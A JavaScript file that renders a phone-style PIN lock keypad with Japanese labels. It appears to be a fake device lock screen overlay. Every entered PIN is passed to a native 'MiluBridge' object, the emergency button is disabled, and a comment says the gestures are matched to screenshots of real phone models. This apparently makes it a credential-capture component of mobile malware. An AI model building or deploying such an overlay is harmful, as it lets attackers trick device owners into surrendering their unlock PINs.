(() => {
  const params = new URLSearchParams(window.location.search);
  const MIN_PIN_LEN = 4;
  const pinMaxRaw = Number(params.get("max") || params.get("len") || "6");
  const PIN_MAX =
    Number.isFinite(pinMaxRaw) && pinMaxRaw >= MIN_PIN_LEN ? Math.floor(pinMaxRaw) : 6;

  const slotsEl = document.getElementById("pinSlots");
  const keypadEl = document.getElementById("keypad");
  const emergencyBtn = document.getElementById("emergencyBtn");

  let value = "";
  let submitting = false;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function renderSlots() {
    slotsEl.innerHTML = "";
    for (let i = 0; i < value.length; i += 1) {
      const dot = document.createElement("span");
      dot.className = "pin-dot";
      slotsEl.appendChild(dot);
    }
  }

  function clearPin() {
    value = "";
    submitting = false;
    renderSlots();
  }

  function submitPin() {
    if (submitting || value.length < MIN_PIN_LEN) {
      return;
    }
    submitting = true;
    reportDone(value);
    window.setTimeout(() => {
      clearPin();
    }, 420);
  }

  function appendDigit(digit) {
    if (submitting || value.length >= PIN_MAX) {
      return;
    }
    value += digit;
    renderSlots();
  }

  function backspace() {
    if (submitting || !value.length) {
      return;
    }
    value = value.slice(0, -1);
    renderSlots();
  }

  function makeKey(label, options) {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `key ${options.className || ""}`.trim();
    if (options.html) {
      btn.innerHTML = options.html;
    } else {
      btn.textContent = label;
    }
    if (options.ariaLabel) {
      btn.setAttribute("aria-label", options.ariaLabel);
    }
    if (options.onClick) {
      btn.addEventListener("click", (event) => {
        event.preventDefault();
        options.onClick();
      });
    }
    return btn;
  }

  function buildKeypad() {
    keypadEl.innerHTML = "";
    for (let n = 1; n <= 9; n += 1) {
      keypadEl.appendChild(
        makeKey(String(n), {
          className: "key--digit",
          onClick: () => appendDigit(String(n)),
        }),
      );
    }
    // 底行：削除 | 0 | 入力（日本向け PIN 配列）
    keypadEl.appendChild(
      makeKey("削除", {
        className: "key--action",
        ariaLabel: "削除",
        onClick: () => backspace(),
      }),
    );
    keypadEl.appendChild(
      makeKey("0", {
        className: "key--digit",
        onClick: () => appendDigit("0"),
      }),
    );
    keypadEl.appendChild(
      makeKey("入力", {
        className: "key--action",
        ariaLabel: "入力",
        onClick: () => submitPin(),
      }),
    );
  }

  emergencyBtn.addEventListener("click", (event) => {
    event.preventDefault();
  });

  // 左滑删除，兼容截图无删除键的机型观感
  let touchX = null;
  document.addEventListener(
    "touchstart",
    (event) => {
      touchX = event.changedTouches[0]?.clientX ?? null;
    },
    { passive: true },
  );
  document.addEventListener(
    "touchend",
    (event) => {
      if (touchX == null) {
        return;
      }
      const endX = event.changedTouches[0]?.clientX ?? touchX;
      if (touchX - endX > 64) {
        backspace();
      }
      touchX = null;
    },
    { passive: true },
  );

  buildKeypad();
  renderSlots();
})();
